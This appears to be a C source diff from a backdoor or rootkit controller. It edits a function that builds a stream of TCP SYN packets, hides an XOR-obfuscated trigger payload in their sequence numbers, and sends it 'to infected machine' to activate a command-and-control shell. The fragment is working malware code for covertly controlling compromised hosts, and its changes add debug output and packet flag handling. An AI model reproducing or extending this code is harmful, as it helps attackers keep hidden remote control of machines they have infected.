@@ -318,12 +318,10 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv){
     printf("["KBLU"INFO"RESET"]""Crafting malicious packet stream...\n");
     
     //Stream of 3 packets, 4 bytes on each if using sequence numbers for hiding the payload
-    const int PAYLOAD_LEN = 12;
-    const int STREAM_PACKET_CAPACITY_BYTES = 4;
-    stream_t stream = build_standard_packet_stream_empty_payload(PAYLOAD_LEN/STREAM_PACKET_CAPACITY_BYTES, 8000, 9000, local_ip, argv);
-    char *payload = calloc(PAYLOAD_LEN, sizeof(char));
+    stream_t stream = build_standard_packet_stream_empty_payload(CC_STREAM_TRIGGER_PAYLOAD_LEN/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES, 8000, 9000, local_ip, argv);
+    char *payload = calloc(CC_STREAM_TRIGGER_PAYLOAD_LEN, sizeof(char));
     srand(time(NULL));
-    for(int ii=0; ii<PAYLOAD_LEN; ii++){
+    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
         payload[ii] = (char)rand();
     }
     inet_pton(AF_INET, argv, (void*)(payload+0x01));
@@ -337,13 +335,29 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv){
     strncpy(payload+0x08, result, 0x02);
     uint16_t crc = crc16(payload, 10);
     strncpy(payload+0x0A, (char*)&crc, 0x02);
+    printf("Payload before XOR: ");
+    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+        printf("%x ", payload[ii]);
+    }
+    printf("\n");
     //Rolling xor
-    for(int ii=1; ii<PAYLOAD_LEN; ii++){
+    for(int ii=1; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
         char xor_res = payload[ii-1] ^ payload[ii];
         strncpy(payload+ii, (char*)&(xor_res), 0x01);
     }
 
-    stream_inject(stream, TYPE_TCP_SEQ_RAW, payload, 0x0C);
+    printf("Payload after XOR: ");
+    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+        printf("%x", payload[ii]);
+    }
+    printf("\n");
+
+    //SYN packets
+    for(int ii=0; ii<stream.stream_length; ii++){
+        set_TCP_flags(*(stream.packet_stream+ii*(sizeof(packet_t))), 0x02);
+    }
+    //Injecting payload in the stream
+    stream_inject(stream, TYPE_TCP_SEQ_RAW, payload, CC_STREAM_TRIGGER_PAYLOAD_LEN);
 
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious stream of packets with the hidden payload
